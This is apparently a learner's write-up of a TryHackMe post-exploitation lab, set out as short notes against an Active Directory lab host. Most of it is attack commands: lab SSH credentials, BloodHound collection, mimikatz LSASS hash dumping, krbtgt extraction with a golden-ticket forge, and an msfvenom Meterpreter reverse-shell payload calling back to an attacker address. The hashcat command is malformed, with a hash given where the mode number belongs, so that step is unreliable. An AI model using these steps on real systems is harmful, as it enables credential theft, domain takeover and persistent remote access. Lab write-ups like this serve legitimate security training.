# PostExploit

[link to the room](https://tryhackme.com/room/postexploit)


`export ip=10.10.2.28`

## Enumeration

- ssh creds : `ssh Administrator@$ip` password:`P@$$W0rd`

### BloodHound
- use sharphound to get loot.zip `Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip`
- analyse the request by frag aand drop the zip file into `bloodhound`

### Dumping hashes w/ mimikatz

- `privilege::debug` This ensures that you're running mimikatz as an administrator
- dump hashes from LSASS `lsadump::lsa /patch`
- found `Password1` for machine1 with hashcat `hashcat -m 64f12cddaa88057e06a81b54e73b949b $rockyou`

### Golden ticket w/ mimikatz
- `lsadump::lsa /inject /name:krbtgt`  dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket
- create a golden ticket `kerberos::golden /user:Administrator /domain: /sid: /krbtgt: /id:`
- `misc::cmd`  This will open a new command prompt with elevated privileges to all machines

### enumeration w /Server manager

- need access with RDP

### maintaining Access

- generate a payload with msfvenom : `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.4.143 LPORT=3311 -f exe -o shell.exe`

### resources 
- https://blog.harmj0y.net/
- https://adsecurity.org/?page_id=1821
- https://metasploit.help.rapid7.com/docs/about-post-exploitation
- http://www.pentest-standard.org/index.php/Post_Exploitation
- https://offsec.red/mimikatz-cheat-sheet/
- https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

### tools
- https://github.com/gentilkiwi/mimikatz
- https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1
- https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
